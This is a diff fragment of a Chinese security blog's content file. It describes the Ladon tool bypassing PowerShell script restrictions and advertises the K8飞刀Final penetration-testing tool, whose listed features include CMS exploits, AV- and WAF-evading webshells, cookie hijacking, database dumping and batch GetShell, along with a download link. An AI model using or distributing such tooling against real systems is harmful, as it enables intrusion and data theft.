+<h3 id="Windows绕过PowerShell限制"><a href="#Windows绕过PowerShell限制" class="headerlink" title="Windows绕过PowerShell限制"></a>Windows绕过PowerShell限制</h3><p>使用Ladon执行，就不存在PowerShell默认禁止执行脚本的限制<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/win_ps1.PNG"></p>
 <h3 id="自定义PowerShell脚本"><a href="#自定义PowerShell脚本" class="headerlink" title="自定义PowerShell脚本"></a>自定义PowerShell脚本</h3><p>其它功能脚本通过以下函数调用即可，或者返回空值的Ladon函数调用代码。<br>如Base64批量密码解密</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Ladon ()&#123;</span><br><span class="line">param([string]$ip) </span><br><span class="line">$pass&#x3D;ConvertFrom-Base64String($ip)</span><br><span class="line">$result&#x3D;-Join($ip,&quot; &quot;,$pass)</span><br><span class="line">return $result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Convert base64 string to string</span><br><span class="line">function ConvertFrom-Base64String([string]$string)</span><br><span class="line">&#123;</span><br><span class="line">    $byteArray &#x3D; [Convert]::FromBase64String($string)</span><br><span class="line">    [System.Text.UnicodeEncoding]::UTF8.GetString($byteArray)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -8852,7 +8852,7 @@ Microsoft Windows 10 for 32-bit Systems 0
   <entry>
     <title>K8飞刀Final</title>
     <url>/p/de1a82bb.html</url>
-    <content><![CDATA[<p><img alt data-original="https://k8gege.org/k8img/k8fly/k8fly.png"></p>
+    <content><![CDATA[<p><img alt="使用http访问查看图片" data-original="/k8img/k8fly/k8fly.png"></p>
 <p><strong>法律声明:</strong> 工具仅供安全研究或授权渗透，非法用途后果自负。<br><br><strong>工具:</strong> K8飞刀Final<br><strong>作者:</strong> K8哥哥<br><strong>博客:</strong> https://www.cnblogs.com/k8gege<br><strong>简介:</strong> 一款多功能网络安全渗透测试工具(Hacker Swiss Army Knife)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1.漏洞利用：&nbsp;&nbsp; 已集成20个主流WEB、CMS程序,累计115个EXP（如Drupal、Joomla、Wordpress、Vbulletin、Xampp、Zimbra、ThinkPHP、Magento、Discuz）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.后台扫描：&nbsp;&nbsp; 后台管理、登陆地址、木马地址、数据等<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3.域名扫描：&nbsp;&nbsp; 子域名扫描、二级域名扫描、WP用户扫描<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4.黑客浏览器： 自动检测SQL注入、比FireFox扩展HackBar更强更全的HTTP参数提交(见EXP调式)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5.EXP 调式：&nbsp;&nbsp; 支持Get/Post/Cookie/UserAgent/Referer/X-Forwarded-For/Client-IP/VIA提交&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 6.生成 EXP：&nbsp;&nbsp; 可将调式好的EXP生成工具，无需编程功底即可实现EXP或直接加入飞刀漏洞利用库<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 7.加密算法：&nbsp;&nbsp; MD5(16)、MD5(32)、SHA1、SHA256、SHA384、SHA512&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8.加密解密：&nbsp;&nbsp; Base32、Base64、Base64(SHA1)支持批量加密解密、DeDe密码、VNC密码、进制转换<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 9.编码转换：&nbsp;&nbsp; Hex(16进制)、URL编码、ASCII码、ASCII码转其它、Unicode转ANSI、ANSI转Unicode&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.文件转换：&nbsp; Hex2File、Hex2Bin、Bin2Hex、File2Hex（可读取任意文件比如EXE或Shellcode）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 11.SQL编码：&nbsp;&nbsp; SQL注入专用CHAR以及HEX路径转换(MSSQL、Mysql、Oracle等数据库)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 12.XSS编码：&nbsp;&nbsp; JS_HEX、JS_Unicode、JS_Escape、FromCharCode、HTML实体加密解密<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 13.Shell管理： 支持7种WebShell(ASP/PHP/JSP/ASPX/CFM/PYTHON/PERL)，多协议连接(仅CMD)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 14.CookieHK：&nbsp; 读取当前登陆站点Cookie(支持httponly)、可使用Cookie直接登陆后台<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 15.WebShell：&nbsp; 内置飞刀专用一句话(UA或其它格式一句话可过大量杀软及WAF防火墙)&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 16.Hacking：&nbsp;&nbsp; VBS随机加密免杀、GetShell、0day网马、硬件BadUSB(Teensy下载者)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 17.脱库工具：&nbsp; 注入点脱库工具、支持自定义关键字或正则提取数据、可采集URL<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 18.GoogleHK：&nbsp; 批量抓取URL、批量检测注入、批量GetShell、批量执行自定义EXP<br><br><strong>最终版</strong>：由于加密硬盘损坏部分飞刀等工具源码无法恢复,2017年底已无法更新飞刀主程序,但很多功能长期可用,漏洞利用库可加EXP<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 朋友们不用再问我要最新版了,没发现我已经差不2两年没更新了，和2012年的一个工具一样,不是我不更新,而是无法更新了<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 加密的源码损坏某个地方，就会导致整个文件无法解密，何况经过两层加密（一层硬盘加密，一层源码加密，源码外还有TC）</p>
 <p><strong>下载地址：</strong><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8%E9%A3%9E%E5%88%80Final.rar</a></p>
 <p><strong>思维导图:</strong>&nbsp; <a href="https://raw.githubusercontent.com/k8gege/K8tools/master/K8%E9%A3%9E%E5%88%80Final.png" target="_blank">https://raw.githubusercontent.com/k8gege/K8tools/master/K8%E9%A3%9E%E5%88%80Final.png</a></p>
@@ -9572,8 +9572,8 @@ from pprint import pprint
         <category>内网渗透</category>
         <category>信息收集</category>
         <category>编程</category>
-        <category>Python</category>
         <category>嗅探</category>
+        <category>Python</category>
       </categories>
       <tags>
         <tag>Tool</tag>
